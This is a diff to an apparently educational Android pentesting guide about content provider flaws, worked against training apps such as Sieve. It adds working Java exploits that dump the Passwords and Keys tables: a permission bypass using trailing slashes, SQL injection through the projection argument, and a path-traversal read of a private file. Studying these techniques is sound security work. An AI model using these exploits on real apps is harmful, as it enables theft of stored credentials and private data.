@@ -29,6 +29,38 @@ Content Providers manage access to a structured set of data in Android applicati
 
 <figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
 
+#### **Code Exploit**&#x20;
+
+```java
+Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");
+Cursor queryCursor = getContentResolver().query(uri,null,null,null,null);
+
+textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
+```
+
+**AndroidManifest.xml** in all exploits should have those lines
+
+```xml
+<queries>
+    <package android:name="com.apphacking.musicplayer"/>
+</queries>
+```
+
+#### Case 1: Permission Bypass
+
+Bypassing the custom user permission, because of the missing regex regarding to the PATH
+
+Simply appending `/////` at the end of our content URI will bypass it.
+
+**Code Exploit**
+
+```java
+Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys/////");
+Cursor queryCursor = getContentResolver().query(uri,null,null,null,null);
+
+textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
+```
+
 ### 2. SQL Injection Vulnerabilities
 
 <figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
@@ -50,6 +82,49 @@ Cursor cursor = db.rawQuery(selection, new String[]{username});
 Now we need to identify the tables in the Java code. We can look for the keyword “`content://`“.
 
 <figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+#### **Case 1**
+
+* We need to query the Passwords table to insert our own SQL statement
+* SQL statement will be inserted via the projection
+* SQL syntax is sth like: `SELECT * FROM Passwords WHERE ....`
+* projection --> `SELECT '* FROM Key--;' (ignored .... FROM Passwords WHERE)`
+
+**Exploit**
+
+```java
+Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");
+
+String[] projection = new String[] {"* FROM KEY--;"};
+Cursor queryCursor = getContentResolver().query(uri,projection,null,null,null);
+
+textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
+```
+
+#### Case 2
+
+* Granting the custom permissions of the sieve application to query the Key table.
+* consider:
+* Define them in the Manifest
+
+```xml
+<uses-permission android:label="@string/perm_descr" android:name="com.mwr.example.sieve.READ_KEYS" android:protectionLevel="dangerous"/>
+<uses-permission android:label="@string/perm_descr" android:name="com.mwr.example.sieve.WRITE_KEYS" android:protectionLevel="dangerous"/>
+```
+
+* We need to ask for them during runtime.&#x20;
+
+```java
+String[] permission = new String[] {"com.mwr.example.sieve.READ_KEYS"};
+ActivityCompat.requestPermissions(this, permission,9001);
+
+Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys");
+
+String[] projection = new String[] {"*"};
+Cursor queryCursor = getContentResolver().query(uri,projection,null,null,null);
+
+textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
+```
 
 **Example SQL Injection Attack:**
 
@@ -88,6 +163,50 @@ Now we need to identify the tables in the Java code. We can look for the keyword
     ```bash
     $ content read --uri content://com.example.provider/../../../../../../etc/hosts
     ```
+
+#### Code Exploit
+
+```java
+public class MainActivity extends AppCompatActivity {
+
+    InputStream inputStream;
+    TextView textView;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        textView = (TextView) findViewById(R.id.textView);
+
+        Uri uri = Uri.parse("content://com.apphacking.musicplayer/../../../../../../../data/data/com.apphacking.musicplayer/files/mySecretFile");
+
+        try {
+            inputStream = getContentResolver().openInputStream(uri);
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
+
+        InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
+        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
+        String fileInput = "";
+
+        try {
+
+            while (bufferedReader.ready()) {
+                fileInput += bufferedReader.readLine();
+                fileInput += "\n";
+            }
+
+        } catch (IOException e) {
+                e.printStackTrace();
+            }
+
+        textView.setText("Accessing mySecretFile: \n" + fileInput);
+
+    }
+}
+```
 
 #### Summary
 
